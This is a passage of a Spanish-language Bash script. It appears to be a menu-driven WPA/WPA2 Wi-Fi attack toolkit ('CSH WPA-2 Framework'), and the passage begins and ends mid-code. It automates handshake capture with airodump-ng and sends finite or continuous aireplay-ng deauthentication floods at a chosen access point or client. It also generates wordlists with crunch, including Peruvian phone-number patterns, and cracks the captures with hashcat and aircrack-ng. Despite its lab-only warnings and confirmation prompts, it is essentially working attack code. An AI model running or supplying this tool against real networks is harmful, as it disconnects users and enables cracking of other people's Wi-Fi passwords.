        printf "%-4s %-19s %-8s %-10s %s\n" "$i" "$station" "$power" "$packets" "$probed"
        i=$((i + 1))
    done

    echo ""
    echo "0. No seleccionar cliente, usar AP general"
    read -r -p "Cliente objetivo para deauth [0-${#CLIENTS[@]}]: " choice

    if [[ "$choice" =~ ^[0-9]+$ ]] && (( choice >= 1 && choice <= ${#CLIENTS[@]} )); then
        idx=$((choice - 1))
        IFS='|' read -r SELECTED_CLIENT _ <<< "${CLIENTS[$idx]}"
        ok "Cliente seleccionado: $SELECTED_CLIENT"
    else
        SELECTED_CLIENT=""
        warn "Se usará deauth general al AP."
    fi
}

has_handshake() {
    local cap="$1"
    [[ -f "$cap" ]] || return 1
    [[ -n "$TARGET_BSSID" ]] || return 1

    aircrack-ng -a2 -b "$TARGET_BSSID" "$cap" 2>/dev/null \
        | grep -Eiq "WPA \([1-9][0-9]* handshake|WPA \(.*handshake"
}

filter_target_pcap() {
    local raw_cap="$1"
    local filtered_cap="$2"

    [[ -f "$raw_cap" ]] || return 1
    command -v tshark >/dev/null 2>&1 || return 1

    tshark -r "$raw_cap" -Y "wlan.addr == ${TARGET_BSSID}" -w "$filtered_cap" >/dev/null 2>&1
}

draw_capture_dashboard() {
    local elapsed="$1"
    local cap="$2"
    local csv="$3"
    local last_action="$4"
    local handshake_status="$5"

    title "CAPTURA EN PROGRESO"

    section "Objetivo"
    printf "%-24s %s\n" "SSID:" "$TARGET_SSID"
    printf "%-24s %s\n" "BSSID:" "$TARGET_BSSID"
    printf "%-24s %s\n" "Canal objetivo:" "$TARGET_CHANNEL"
    printf "%-24s %s\n" "Frecuencia:" "$(channel_to_freq "$TARGET_CHANNEL")"
    printf "%-24s %s\n" "Handshake:" "$handshake_status"

    section "Interfaz"
    printf "%-24s %s\n" "Interfaz:" "$INTERFACE"
    printf "%-24s %s\n" "Canal actual:" "$(get_iface_channel)"
    printf "%-24s %s\n" "Frecuencia actual:" "$(get_iface_frequency)"
    printf "%-24s %s\n" "Potencia TX:" "$(get_iface_txpower)"

    section "Estado"
    printf "%-24s %ss / %ss\n" "Tiempo:" "$elapsed" "$CAPTURE_TIMEOUT"
    printf "%-24s %s\n" "Última acción:" "$last_action"
    printf "%-24s %s\n" "Archivo CAP:" "$cap"

    section "Clientes del objetivo detectados"
    if [[ -f "$csv" ]]; then
        mapfile -t LIVE_CLIENTS < <(parse_clients_for_bssid "$csv" "$TARGET_BSSID")
        if (( ${#LIVE_CLIENTS[@]} == 0 )); then
            warn "Sin clientes asociados detectados todavía."
        else
            printf "%-4s %-19s %-8s %-10s %s\n" "N°" "CLIENTE" "PWR" "PACKETS" "PROBED"
            echo "────────────────────────────────────────────────────────────────────────"
            local i=1 item station power packets probed
            for item in "${LIVE_CLIENTS[@]}"; do
                IFS='|' read -r station power packets probed <<< "$item"
                printf "%-4s %-19s %-8s %-10s %s\n" "$i" "$station" "$power" "$packets" "$probed"
                i=$((i + 1))
            done
        fi
    else
        warn "Esperando CSV..."
    fi

    echo ""
    line
    echo -e "${DIM}Ctrl+C para detener. La captura parcial se conserva.${RESET}"
}

capture_handshake() {
    local mode="$1"
    local deauth_count="${2:-0}"
    local deauth_every="${3:-10}"
    local deauth_client="${4:-}"

    if [[ -z "$TARGET_BSSID" || -z "$TARGET_CHANNEL" ]]; then
        err "Primero selecciona una red objetivo."
        pause
        return
    fi

    ensure_monitor_mode || return 1

    if [[ "$mode" != "passive" ]]; then
        confirm_authorized_action "$mode" || return 1
    fi

    mkdir -p "$CAPTURE_DIR" "$REPORT_DIR"

    local clean_bssid timestamp safe_ssid prefix cap csv filtered_cap report
    clean_bssid="${TARGET_BSSID//:/}"
    timestamp="$(date +%Y%m%d_%H%M%S)"
    safe_ssid="$(safe_filename "$TARGET_SSID")"
    prefix="${CAPTURE_DIR}/${safe_ssid}_${clean_bssid}_ch${TARGET_CHANNEL}_${timestamp}"
    cap="${prefix}-01.cap"
    csv="${prefix}-01.csv"
    filtered_cap="${prefix}_TARGET_ONLY.cap"
    report="${REPORT_DIR}/${safe_ssid}_${clean_bssid}_${timestamp}.txt"

    set_target_channel

    title "CAPTURA DE HANDSHAKE"
    section "Objetivo"
    printf "%-22s %s\n" "SSID:" "$TARGET_SSID"
    printf "%-22s %s\n" "BSSID:" "$TARGET_BSSID"
    printf "%-22s %s\n" "Canal:" "$TARGET_CHANNEL"
    printf "%-22s %s\n" "Modo:" "$mode"
    printf "%-22s %s\n" "Archivo:" "$cap"

    section "Captura"
    warn "Airodump se limitará al BSSID objetivo."
    warn "Usa esta función solo en redes propias o con permiso explícito."

    airodump-ng --bssid "$TARGET_BSSID" -c "$TARGET_CHANNEL" \
        --write "$prefix" --output-format cap,csv "$INTERFACE" >/dev/null 2>&1 &
    AIRODUMP_PID=$!
    sleep 3

    local start elapsed next_deauth last_action handshake_status
    start="$(date +%s)"
    next_deauth=0
    last_action="Captura iniciada"
    handshake_status="No capturado"

    tput civis 2>/dev/null || true

    while true; do
        elapsed=$(( $(date +%s) - start ))
        (( elapsed >= CAPTURE_TIMEOUT )) && break

        if [[ -f "$cap" ]] && has_handshake "$cap"; then
            handshake_status="Capturado"
            LAST_CAP="$cap"
            filter_target_pcap "$cap" "$filtered_cap" || true
            [[ -f "$filtered_cap" ]] && LAST_FILTERED_CAP="$filtered_cap"
            break
        fi

        if [[ "$mode" == "finite_deauth" && "$elapsed" -ge 2 && "$next_deauth" -eq 0 ]]; then
            if [[ -n "$deauth_client" ]]; then
                aireplay-ng --deauth "$deauth_count" -a "$TARGET_BSSID" -c "$deauth_client" "$INTERFACE" >/dev/null 2>&1 &
                last_action="Deauth finito x${deauth_count} al cliente $deauth_client"
            else
                aireplay-ng --deauth "$deauth_count" -a "$TARGET_BSSID" "$INTERFACE" >/dev/null 2>&1 &
                last_action="Deauth finito x${deauth_count} al AP objetivo"
            fi
            next_deauth=999999
        fi

        if [[ "$mode" == "loop_deauth" && "$elapsed" -ge "$next_deauth" ]]; then
            if [[ -n "$deauth_client" ]]; then
                aireplay-ng --deauth "$deauth_count" -a "$TARGET_BSSID" -c "$deauth_client" "$INTERFACE" >/dev/null 2>&1 &
                last_action="Deauth continuo x${deauth_count} al cliente $deauth_client"
            else
                aireplay-ng --deauth "$deauth_count" -a "$TARGET_BSSID" "$INTERFACE" >/dev/null 2>&1 &
                last_action="Deauth continuo x${deauth_count} al AP objetivo"
            fi
            next_deauth=$(( elapsed + deauth_every ))
        fi

        draw_capture_dashboard "$elapsed" "$cap" "$csv" "$last_action" "$handshake_status"
        sleep 2
    done

    tput cnorm 2>/dev/null || true
    cleanup_runtime

    [[ -f "$cap" ]] && LAST_CAP="$cap"
    filter_target_pcap "$cap" "$filtered_cap" || true
    [[ -f "$filtered_cap" ]] && LAST_FILTERED_CAP="$filtered_cap"

    {
        echo "WPA Toolkit Report"
        echo "=================="
        echo "Fecha: $(date)"
        echo "SSID: $TARGET_SSID"
        echo "BSSID: $TARGET_BSSID"
        echo "Canal: $TARGET_CHANNEL"
        echo "Frecuencia: $(channel_to_freq "$TARGET_CHANNEL")"
        echo "Privacy: $TARGET_PRIVACY"
        echo "Cipher: $TARGET_CIPHER"
        echo "Auth: $TARGET_AUTH"
        echo "CAP: $cap"
        echo "Filtered CAP: ${LAST_FILTERED_CAP:-N/A}"
        echo "Handshake: $handshake_status"
    } > "$report"

    # Reporte Markdown enriquecido junto al .txt
    local report_md="${report%.txt}.md"
    build_markdown_report "$report_md" "$handshake_status" "$cap" "${LAST_FILTERED_CAP:-N/A}"

    title "RESULTADO DE CAPTURA"
    if [[ "$handshake_status" == "Capturado" ]]; then
        echo -e "${GREEN}${BOLD}✓ Handshake capturado para $TARGET_SSID${RESET}"
    else
        echo -e "${RED}${BOLD}✗ No se detectó handshake dentro del tiempo configurado${RESET}"
    fi

    section "Archivos"
    if [[ -f "$cap" ]]; then
        echo "CAP raw:"
        ls -lh "$cap"
    fi

    if [[ -f "$filtered_cap" ]]; then
        echo ""
        echo "CAP filtrado al objetivo:"
        ls -lh "$filtered_cap"
    else
        warn "No se generó CAP filtrado. Instala tshark con: sudo dnf install wireshark-cli"
    fi

    echo ""
    echo "Reportes:"
    ls -lh "$report" "$report_md" 2>/dev/null

    section "Siguiente paso"
    if [[ "$handshake_status" == "Capturado" ]]; then
        echo "Puedes verificar el CAP desde el menú."
    else
        echo "Recomendaciones:"
        echo "  - Asegúrate de que haya clientes conectados."
        echo "  - Aumenta el timeout."
        echo "  - Usa captura pasiva y espera una reconexión natural en laboratorio."
    fi

    pause
}

deauth_only_finite() {
    if [[ -z "$TARGET_BSSID" ]]; then
        err "Primero selecciona objetivo."
        pause
        return
    fi

    ensure_monitor_mode || return 1

    title "DEAUTH FINITO"
    section "Objetivo"
    echo "SSID:  $TARGET_SSID"
    echo "BSSID: $TARGET_BSSID"
    echo "Canal: $TARGET_CHANNEL"

    local count
    echo ""
    read -r -p "Número de deauths a enviar [10]: " count
    count="${count:-10}"

    if [[ ! "$count" =~ ^[0-9]+$ ]]; then
        err "Número inválido."
        pause
        return
    fi

    select_client_optional
    local client="$SELECTED_CLIENT"

    confirm_authorized_action "deauth finito" || return
    set_target_channel

    section "Ejecutando"
    if [[ -n "$client" ]]; then
        aireplay-ng --deauth "$count" -a "$TARGET_BSSID" -c "$client" "$INTERFACE"
    else
        aireplay-ng --deauth "$count" -a "$TARGET_BSSID" "$INTERFACE"
    fi

    pause
}

deauth_only_loop() {
    if [[ -z "$TARGET_BSSID" ]]; then
        err "Primero selecciona objetivo."
        pause
        return
    fi

    ensure_monitor_mode || return 1

    title "DEAUTH CONTINUO"
    warn "Esto enviará deauth repetidamente hasta que presiones Ctrl+C."
    warn "Úsalo solo en laboratorio autorizado."

    local count interval
    echo ""
    read -r -p "Deauth por ráfaga [5]: " count
    count="${count:-5}"

    read -r -p "Intervalo entre ráfagas en segundos [5]: " interval
    interval="${interval:-5}"

    if [[ ! "$count" =~ ^[0-9]+$ || ! "$interval" =~ ^[0-9]+$ ]]; then
        err "Valores inválidos."
        pause
        return
    fi

    select_client_optional
    local client="$SELECTED_CLIENT"

    confirm_authorized_action "deauth continuo" || return
    set_target_channel

    title "DEAUTH CONTINUO ACTIVO"
    warn "Presiona Ctrl+C para detener."
    echo ""

    while true; do
        if [[ -n "$client" ]]; then
            echo "[*] Enviando deauth x$count a cliente $client..."
            aireplay-ng --deauth "$count" -a "$TARGET_BSSID" -c "$client" "$INTERFACE"
        else
            echo "[*] Enviando deauth x$count al AP objetivo..."
            aireplay-ng --deauth "$count" -a "$TARGET_BSSID" "$INTERFACE"
        fi
        sleep "$interval"
    done
}

verify_handshake() {
    title "VERIFICAR HANDSHAKE"

    local cap="$LAST_CAP"
    if [[ -z "$cap" || ! -f "$cap" ]]; then
        warn "No hay última captura registrada."
        echo ""
        read -r -p "Ruta del archivo .cap: " cap
    fi

    if [[ ! -f "$cap" ]]; then
        err "Archivo no encontrado: $cap"
        pause
        return
    fi

    if [[ -z "$TARGET_BSSID" ]]; then
        read -r -p "BSSID objetivo: " TARGET_BSSID
    fi

    section "Validando"
    echo "CAP:   $cap"
    echo "BSSID: $TARGET_BSSID"
    echo ""

    aircrack-ng -a2 -b "$TARGET_BSSID" "$cap"
    echo ""

    if has_handshake "$cap"; then
        ok "Handshake detectado para $TARGET_BSSID"
    else
        err "No se detectó handshake para $TARGET_BSSID"
    fi

    pause
}

# ─────────────────────────────────────────────────────────────────────────────
#  Utilidades compartidas: resolución de CAP y selección de diccionario
# ─────────────────────────────────────────────────────────────────────────────

# Devuelve en la variable global PICKED_CAP un .cap válido (preferir filtrado).
PICKED_CAP=""
pick_cap_file() {
    PICKED_CAP=""
    local cap=""
    if [[ -n "$LAST_FILTERED_CAP" && -f "$LAST_FILTERED_CAP" ]]; then
        cap="$LAST_FILTERED_CAP"
    elif [[ -n "$LAST_CAP" && -f "$LAST_CAP" ]]; then
        cap="$LAST_CAP"
    fi

    if [[ -n "$cap" ]]; then
        echo "Última captura: $cap"
        read -r -p "ENTER para usarla, o escribe otra ruta .cap: " alt
        [[ -n "$alt" ]] && cap="$alt"
    else
        warn "No hay captura registrada en esta sesión."
        read -r -p "Ruta del archivo .cap: " cap
    fi

    if [[ ! -f "$cap" ]]; then
        err "Archivo no encontrado: $cap"
        return 1
    fi
    PICKED_CAP="$cap"
    return 0
}

human_lines() {
    local f="$1"
    [[ -f "$f" ]] || { echo "?"; return; }
    wc -l < "$f" 2>/dev/null | tr -d ' '
}

# Lista wordlists conocidas y deja la elegida en SELECTED_WORDLIST.
select_wordlist() {
    mkdir -p "$WORDLIST_DIR"
    local -a found=()
    local candidates=(
        "/usr/share/wordlists/rockyou.txt"
        "/usr/share/wordlists/rockyou.txt.gz"
        "/usr/share/wordlists/fasttrack.txt"
        "/usr/share/dict/words"
    )
    local c
    for c in "${candidates[@]}"; do
        [[ -f "$c" ]] && found+=("$c")
    done
    while IFS= read -r c; do
        [[ -n "$c" ]] && found+=("$c")
    done < <(find "$WORDLIST_DIR" -maxdepth 1 -type f \( -name '*.txt' -o -name '*.lst' -o -name '*.dict' \) 2>/dev/null | sort)

    section "Diccionarios disponibles"
    if (( ${#found[@]} == 0 )); then
        warn "No se encontraron diccionarios. Usa el Gestor de diccionarios (opción del menú)."
        read -r -p "Ruta manual del diccionario: " SELECTED_WORDLIST
        [[ -f "$SELECTED_WORDLIST" ]] && return 0 || { err "No existe."; return 1; }
    fi

    printf "%-4s %-12s %s\n" "N°" "LÍNEAS" "RUTA"
    echo "────────────────────────────────────────────────────────────────────"
    local i=1 f tag
    for f in "${found[@]}"; do
        tag=""
        [[ "$f" == *.gz ]] && tag=" ${DIM}(comprimido)${RESET}"
        printf "%-4s %-12s %s%b\n" "$i" "$(human_lines "$f")" "$f" "$tag"
        i=$((i + 1))
    done
    echo ""
    echo "m. Ingresar ruta manual"
    echo "0. Cancelar"
    echo ""
    local choice
    read -r -p "Selecciona diccionario: " choice

    case "$choice" in
        0) return 1 ;;
        m|M) read -r -p "Ruta: " SELECTED_WORDLIST ;;
        *)
            if [[ "$choice" =~ ^[0-9]+$ ]] && (( choice >= 1 && choice <= ${#found[@]} )); then
                SELECTED_WORDLIST="${found[$((choice-1))]}"
            else
                err "Selección inválida."; return 1
            fi
            ;;
    esac

    # Descomprimir rockyou.gz automáticamente a wordlists/.
    if [[ "$SELECTED_WORDLIST" == *.gz ]]; then
        local dest="$WORDLIST_DIR/$(basename "${SELECTED_WORDLIST%.gz}")"
        if [[ ! -f "$dest" ]]; then
            warn "Descomprimiendo a $dest ..."
            gunzip -c "$SELECTED_WORDLIST" > "$dest" 2>/dev/null || { err "No se pudo descomprimir."; return 1; }
        fi
        SELECTED_WORDLIST="$dest"
    fi

    [[ -f "$SELECTED_WORDLIST" ]] || { err "No existe: $SELECTED_WORDLIST"; return 1; }
    ok "Diccionario: $SELECTED_WORDLIST ($(human_lines "$SELECTED_WORDLIST") líneas)"
    return 0
}

# ─────────────────────────────────────────────────────────────────────────────
#  Gestor de diccionarios
# ─────────────────────────────────────────────────────────────────────────────
wordlist_manager() {
    while true; do
        title "GESTOR DE DICCIONARIOS"

        section "Diccionarios en $WORDLIST_DIR/"
        mkdir -p "$WORDLIST_DIR"
        if compgen -G "$WORDLIST_DIR/*" >/dev/null 2>&1; then
            local f
            for f in "$WORDLIST_DIR"/*; do
                [[ -f "$f" ]] && printf "  %-10s %s\n" "$(human_lines "$f")" "$(basename "$f")"
            done
        else
            warn "Vacío."
        fi

        section "rockyou"
        if [[ -f "$WORDLIST_DIR/rockyou.txt" ]]; then
            ok "rockyou.txt ya disponible en el proyecto."
        elif [[ -f /usr/share/wordlists/rockyou.txt ]]; then
            ok "rockyou.txt del sistema detectado (/usr/share/wordlists/rockyou.txt)."
        elif [[ -f /usr/share/wordlists/rockyou.txt.gz ]]; then
            warn "rockyou.txt.gz del sistema detectado (sin descomprimir)."
        else
            warn "rockyou no encontrado.  sudo dnf install wordlists  (o descárgalo)."
        fi

        section "Opciones"
        echo "1. Importar/descomprimir rockyou del sistema a $WORDLIST_DIR/"
        echo "2. Generar wordlist numérica (crunch) — ej. celulares, PINs"
        echo "3. Generar wordlist desde patrón personalizado (crunch)"
        echo "4. Fijar diccionario por defecto para ataques"
        echo "0. Volver"
        echo ""
        local opt
        read -r -p "Selecciona opción: " opt

        case "$opt" in
            1)
                local src=""
                [[ -f /usr/share/wordlists/rockyou.txt ]] && src="/usr/share/wordlists/rockyou.txt"
                [[ -z "$src" && -f /usr/share/wordlists/rockyou.txt.gz ]] && src="/usr/share/wordlists/rockyou.txt.gz"
                if [[ -z "$src" ]]; then
                    err "No se encontró rockyou en el sistema."
                else
                    if [[ "$src" == *.gz ]]; then
                        gunzip -c "$src" > "$WORDLIST_DIR/rockyou.txt" && ok "Copiado y descomprimido."
                    else
                        cp "$src" "$WORDLIST_DIR/rockyou.txt" && ok "Copiado."
                    fi
                fi
                pause
                ;;
            2)
                if (( HAS_CRUNCH == 0 )); then
                    err "crunch no está instalado:  sudo dnf install crunch"
                    pause; continue
                fi
                echo ""
                echo "Plantillas rápidas:"
                echo "  a) 8 dígitos empezando en 9 (celulares Perú: 9XXXXXXX)"
                echo "  b) PIN de 8 dígitos (00000000-99999999)"
                echo "  c) Personalizado"
                local tpl out
                read -r -p "Elige a/b/c: " tpl
                read -r -p "Nombre del archivo de salida (sin ruta): " out
                [[ -n "$out" ]] || { err "Nombre vacío."; pause; continue; }
                out="$WORDLIST_DIR/$(safe_filename "$out").txt"
                case "$tpl" in
                    a) warn "Generando 9XXXXXXX (10M líneas aprox)..."; crunch 8 8 1234567890 -t 9%%%%%%% -o "$out" ;;
                    b) warn "Generando 00000000-99999999..."; crunch 8 8 1234567890 -o "$out" ;;
                    c)
                        local len charset tmpl
                        read -r -p "Longitud mínima: " len
                        local lmax
                        read -r -p "Longitud máxima: " lmax
                        read -r -p "Charset (ej. 1234567890abcdef): " charset
                        read -r -p "Plantilla -t (opcional, ENTER para omitir): " tmpl
                        if [[ -n "$tmpl" ]]; then
                            crunch "$len" "$lmax" "$charset" -t "$tmpl" -o "$out"
                        else
                            crunch "$len" "$lmax" "$charset" -o "$out"
                        fi
                        ;;
                    *) err "Opción inválida."; pause; continue ;;
                esac
                [[ -f "$out" ]] && ok "Generado: $out ($(human_lines "$out") líneas)"
                pause
                ;;
            3)
                if (( HAS_CRUNCH == 0 )); then
                    err "crunch no está instalado:  sudo dnf install crunch"
                    pause; continue
                fi
                echo ""
                echo "Marcadores -t de crunch:  @=letra  ,=MAYÚS  %=dígito  ^=símbolo"
                local mn mx cs tp out
                read -r -p "Longitud mínima: " mn
                read -r -p "Longitud máxima: " mx
                read -r -p "Charset base (ENTER=abc...0-9): " cs
                read -r -p "Plantilla -t (ej. Lab20%%%%): " tp
                read -r -p "Nombre de salida (sin ruta): " out
                out="$WORDLIST_DIR/$(safe_filename "${out:-custom}").txt"
                cs="${cs:-abcdefghijklmnopqrstuvwxyz0123456789}"
                if [[ -n "$tp" ]]; then
                    crunch "$mn" "$mx" "$cs" -t "$tp" -o "$out"
                else
                    crunch "$mn" "$mx" "$cs" -o "$out"
                fi
                [[ -f "$out" ]] && ok "Generado: $out ($(human_lines "$out") líneas)"
                pause
                ;;
            4)
                select_wordlist && { ok "Por defecto: $SELECTED_WORDLIST"; }
                pause
                ;;
            0) return ;;
            *) err "Opción inválida."; pause ;;
        esac
    done
}

# ─────────────────────────────────────────────────────────────────────────────
#  Hashcat / formato 22000
# ─────────────────────────────────────────────────────────────────────────────
convert_cap_to_22000() {
    local cap="$1" out="$2"
    [[ -f "$cap" ]] || return 1
    (( HAS_HCXTOOLS == 1 )) || return 2
    hcxpcapngtool -o "$out" "$cap" >/dev/null 2>&1
    [[ -s "$out" ]]
}

hashcat_menu() {
    title "HASHCAT / FORMATO 22000 (GPU)"

    if (( HAS_HCXTOOLS == 0 )); then
        err "Se requiere hcxpcapngtool para convertir .cap → .22000"
        echo "  sudo dnf install hcxtools"
        pause
        return
    fi

    section "Seleccionar captura"
    pick_cap_file || { pause; return; }

    mkdir -p "$HASH_DIR"
    local base out
    base="$(basename "${PICKED_CAP%.*}")"
    out="$HASH_DIR/${base}.22000"

    section "Convirtiendo"
    echo "Origen:  $PICKED_CAP"
    echo "Destino: $out"
    echo ""
    if convert_cap_to_22000 "$PICKED_CAP" "$out"; then
        LAST_22000="$out"
        ok "Hash 22000 generado: $out"
        echo ""
        grep -c . "$out" 2>/dev/null | xargs -I{} echo "  Líneas de hash (PMKID/EAPOL): {}"
    else
        err "No se extrajo ningún hash. ¿La captura contiene handshake/PMKID válido?"
        pause
        return
    fi

    section "Cracking con hashcat"
    if (( HAS_HASHCAT == 0 )); then
        warn "hashcat no está instalado. Comando sugerido para otra máquina con GPU:"
        echo "  hashcat -m 22000 -a 0 \"$out\" <diccionario>"
        pause
        return
    fi

    read -r -p "¿Ejecutar hashcat ahora con un diccionario? [s/N]: " go
    if [[ "$go" =~ ^[sS]$ ]]; then
        select_wordlist || { pause; return; }
        echo ""
        warn "Ejecutando: hashcat -m 22000 -a 0 (modo diccionario)"
        echo ""
        hashcat -m 22000 -a 0 "$out" "$SELECTED_WORDLIST" --status --status-timer=10
        echo ""
        section "Resultados (potfile)"
        hashcat -m 22000 "$out" --show 2>/dev/null || true
    fi
    pause
}

# ─────────────────────────────────────────────────────────────────────────────
#  Reportes en Markdown
# ─────────────────────────────────────────────────────────────────────────────
build_markdown_report() {
    local report="$1" handshake_status="$2" cap="$3" filtered="$4"
    {
        echo "# Reporte de auditoría WPA/WPA2 — CSH Framework"
        echo ""
        echo "> Uso exclusivo en laboratorio propio o con autorización explícita."
        echo ""
        echo "| Campo | Valor |"
        echo "|---|---|"
        echo "| Fecha | $(date '+%Y-%m-%d %H:%M:%S') |"
        echo "| Operador | $(logname 2>/dev/null || echo "${SUDO_USER:-root}") |"
        echo "| SSID | ${TARGET_SSID:-N/A} |"
        echo "| BSSID | ${TARGET_BSSID:-N/A} |"
        echo "| Canal | ${TARGET_CHANNEL:-N/A} |"
        echo "| Frecuencia | $(channel_to_freq "$TARGET_CHANNEL") |"
        echo "| Cifrado | $(encr_label "$TARGET_PRIVACY" "$TARGET_AUTH") |"
        echo "| Privacy | ${TARGET_PRIVACY:-N/A} |"
        echo "| Cipher | ${TARGET_CIPHER:-N/A} |"
        echo "| Auth | ${TARGET_AUTH:-N/A} |"
        echo "| Potencia | ${TARGET_POWER:-N/A} |"
        echo "| Handshake | ${handshake_status:-N/A} |"
        echo ""
        echo "## Archivos"
        echo ""
        echo "- CAP crudo: \`${cap:-N/A}\`"
        echo "- CAP filtrado: \`${filtered:-N/A}\`"
        echo "- Hash 22000: \`${LAST_22000:-N/A}\`"
        echo ""
        echo "## Próximos pasos sugeridos"
        echo ""
        if [[ "$handshake_status" == "Capturado" ]]; then
            echo "1. Verificar el handshake con \`aircrack-ng\`."
            echo "2. Convertir a formato 22000 y crackear con hashcat (GPU)."
            echo "3. Validar contra el diccionario autorizado del laboratorio."
        else
            echo "1. Asegurar que haya clientes asociados al AP."
            echo "2. Repetir captura con deauth dirigido a un cliente."
            echo "3. Ampliar el timeout de captura."
        fi
        echo ""
        echo "---"
        echo "_Generado por CSH WPA-2 Framework v${APP_VERSION}._"
    } > "$report"
}

dictionary_attack() {
    title "VALIDACIÓN CON DICCIONARIO"

    if [[ -z "$TARGET_BSSID" ]]; then
        warn "No hay BSSID objetivo cargado."
        read -r -p "BSSID: " TARGET_BSSID
    fi

    local cap="$LAST_CAP"
    if [[ -z "$cap" || ! -f "$cap" ]]; then
        warn "No hay última captura registrada."
        read -r -p "Ruta del archivo .cap: " cap
    fi

    if [[ ! -f "$cap" ]]; then
        err "Archivo no encontrado: $cap"
        pause
        return
    fi

    if ! has_handshake "$cap"; then
        warn "No se detectó handshake en este CAP para $TARGET_BSSID."
        read -r -p "¿Deseas continuar igual? [s/N]: " cont
        [[ "$cont" =~ ^[sS]$ ]] || return
    fi

    local wordlist=""
    if select_wordlist; then
        wordlist="$SELECTED_WORDLIST"
    else
        warn "Sin diccionario seleccionado."
        pause
        return
    fi

    if [[ ! -f "$wordlist" ]]; then
        err "Diccionario no encontrado: $wordlist"
        pause
        return
    fi

    section "Ejecutando aircrack-ng"
    echo "SSID:      ${TARGET_SSID:-N/A}"
    echo "BSSID:     $TARGET_BSSID"
    echo "CAP:       $cap"
    echo "Wordlist:  $wordlist"
    echo ""

    aircrack-ng -a2 -b "$TARGET_BSSID" -w "$wordlist" "$cap"
    pause
}

list_artifacts() {
    title "CAPTURAS Y REPORTES"

    section "Capturas recientes"
    if compgen -G "$CAPTURE_DIR/*.cap" >/dev/null 2>&1; then
        find "$CAPTURE_DIR" -maxdepth 1 -type f -name '*.cap' -printf '%TY-%Tm-%Td %TH:%TM  %p\n' | sort -r | head -n 20
    else
        warn "No hay capturas .cap todavía."
    fi

    section "Reportes recientes"
    if compgen -G "$REPORT_DIR/*.txt" >/dev/null 2>&1 || compgen -G "$REPORT_DIR/*.md" >/dev/null 2>&1; then
        find "$REPORT_DIR" -maxdepth 1 -type f \( -name '*.txt' -o -name '*.md' \) -printf '%TY-%Tm-%Td %TH:%TM  %p\n' | sort -r | head -n 20
    else
        warn "No hay reportes todavía."
    fi

    section "Hashes 22000 (hashcat)"
    if compgen -G "$HASH_DIR/*.22000" >/dev/null 2>&1; then
        find "$HASH_DIR" -maxdepth 1 -type f -name '*.22000' -printf '%TY-%Tm-%Td %TH:%TM  %p\n' | sort -r | head -n 20
    else
        warn "Sin hashes convertidos. Usa el menú de hashcat."
    fi

    pause
}

capture_menu() {
    if [[ -z "$TARGET_BSSID" ]]; then
        err "Primero selecciona una red objetivo."
        pause
        return
    fi

    while true; do
        title "TIPO DE CAPTURA / ACCIÓN"

        section "Objetivo actual"
        echo "SSID:  $TARGET_SSID"
        echo "BSSID: $TARGET_BSSID"
        echo "Canal: $TARGET_CHANNEL"
        echo "Auth:  $TARGET_AUTH"
        echo "Enc:   $TARGET_PRIVACY / $TARGET_CIPHER"

        section "Opciones"
        echo "1. Captura pasiva de handshake"
        echo "2. Captura handshake + deauth finito"
        echo "3. Captura handshake + deauth continuo hasta handshake/timeout"
        echo "4. Solo deauth finito"
        echo "5. Solo deauth continuo hasta Ctrl+C"
        echo "0. Volver"

        echo ""
        local opt t count every client
        read -r -p "Selecciona opción: " opt

        case "$opt" in
            1)
                read -r -p "Timeout de captura en segundos [$CAPTURE_TIMEOUT]: " t
                t="${t:-$CAPTURE_TIMEOUT}"
                if [[ "$t" =~ ^[0-9]+$ && "$t" -ge 10 ]]; then CAPTURE_TIMEOUT="$t"; else err "Timeout inválido."; pause; continue; fi
                capture_handshake "passive"
                ;;
            2)
                read -r -p "Timeout de captura en segundos [$CAPTURE_TIMEOUT]: " t
                t="${t:-$CAPTURE_TIMEOUT}"
                if [[ "$t" =~ ^[0-9]+$ && "$t" -ge 10 ]]; then CAPTURE_TIMEOUT="$t"; else err "Timeout inválido."; pause; continue; fi
                read -r -p "Número de deauths [10]: " count
                count="${count:-10}"
                if [[ ! "$count" =~ ^[0-9]+$ ]]; then err "Número inválido."; pause; continue; fi
                select_client_optional
                client="$SELECTED_CLIENT"
                capture_handshake "finite_deauth" "$count" 10 "$client"
                ;;
            3)
                read -r -p "Timeout de captura en segundos [$CAPTURE_TIMEOUT]: " t
                t="${t:-$CAPTURE_TIMEOUT}"
                if [[ "$t" =~ ^[0-9]+$ && "$t" -ge 10 ]]; then CAPTURE_TIMEOUT="$t"; else err "Timeout inválido."; pause; continue; fi
                read -r -p "Deauth por ráfaga [5]: " count
                count="${count:-5}"
                read -r -p "Intervalo entre ráfagas en segundos [8]: " every
                every="${every:-8}"
                if [[ ! "$count" =~ ^[0-9]+$ || ! "$every" =~ ^[0-9]+$ ]]; then err "Valores inválidos."; pause; continue; fi
                select_client_optional
                client="$SELECTED_CLIENT"
                capture_handshake "loop_deauth" "$count" "$every" "$client"
                ;;
            4)
                deauth_only_finite
                ;;
            5)
                deauth_only_loop
                ;;
            0)
                return
                ;;
            *)
                err "Opción inválida."
                pause
                ;;
        esac
    done
}

settings_menu() {
    while true; do
        title "CONFIGURACIÓN"
        section "Estado actual"
        show_interface_info
        printf "%-22s %ss\n" "Tiempo escaneo:" "$SCAN_SECONDS"
        printf "%-22s %ss\n" "Timeout captura:" "$CAPTURE_TIMEOUT"
        printf "%-22s %s\n" "Dir capturas:" "$CAPTURE_DIR"
        printf "%-22s %s\n" "Dir reportes:" "$REPORT_DIR"
        printf "%-22s %s\n" "Dir hashes:" "$HASH_DIR"
        printf "%-22s %s\n" "Dir wordlists:" "$WORDLIST_DIR"

        section "Opciones"
        echo "1. Cambiar interfaz"
        echo "2. Activar / validar modo monitor"
        echo "3. Restaurar WiFi normal (modo managed)"
        echo "4. Cambiar tiempo de escaneo"
        echo "5. Cambiar timeout de captura"
        echo "6. Resetear autorización de sesión"
        echo "0. Volver"
        echo ""

        local opt val
        read -r -p "Selecciona opción: " opt
        case "$opt" in
            1)
                select_interface 1
                ;;
            2)
                ensure_monitor_mode
                pause
                ;;
            3)
                restore_managed_mode
                ;;
            4)
                read -r -p "Nuevo tiempo de escaneo en segundos: " val
                if [[ "$val" =~ ^[0-9]+$ && "$val" -ge 3 ]]; then
                    SCAN_SECONDS="$val"
                    ok "Tiempo de escaneo actualizado a ${SCAN_SECONDS}s"
                else
                    err "Valor inválido. Usa entero >= 3."
                fi
                pause
                ;;
            5)
                read -r -p "Nuevo timeout de captura en segundos: " val
                if [[ "$val" =~ ^[0-9]+$ && "$val" -ge 10 ]]; then
                    CAPTURE_TIMEOUT="$val"
                    ok "Timeout actualizado a ${CAPTURE_TIMEOUT}s"
                else
